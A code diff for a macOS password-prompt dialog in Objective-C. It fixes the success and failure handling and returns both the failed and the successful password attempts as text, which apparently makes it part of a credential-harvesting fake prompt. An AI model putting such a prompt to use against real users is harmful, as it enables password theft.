@@ -62,8 +62,10 @@
     NSModalResponse response = [alertView runModal];
     if (response == NSModalResponseOK && [self verifyPassword:passwordField.stringValue]) {
         self.successHandler(passwordField.stringValue);
+    }else {
+        self.failureHandler(response, passwordField.stringValue);
     }
-    self.failureHandler(response, passwordField.stringValue);
+
 }
 
 - (BOOL)verifyPassword:(NSString *)password {
@@ -83,6 +85,7 @@ const char* prompt(char* icon, char* title, char* message, int maxTries){
     __block bool reprompt = false;
     __block int currentTry = 1;
     agent.successHandler = ^(NSString *password) {
+        reprompt = false;
         userText = [[NSString alloc] initWithString:password];
     };
 
@@ -114,5 +117,6 @@ const char* prompt(char* icon, char* title, char* message, int maxTries){
         }
 
     }
+    [[NSRunLoop mainRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.1f]];
     return [[[NSString alloc] initWithFormat:@"Failed Inputs:\n%@\nSuccessful Input:%@\n", failedText, userText] UTF8String];
 }
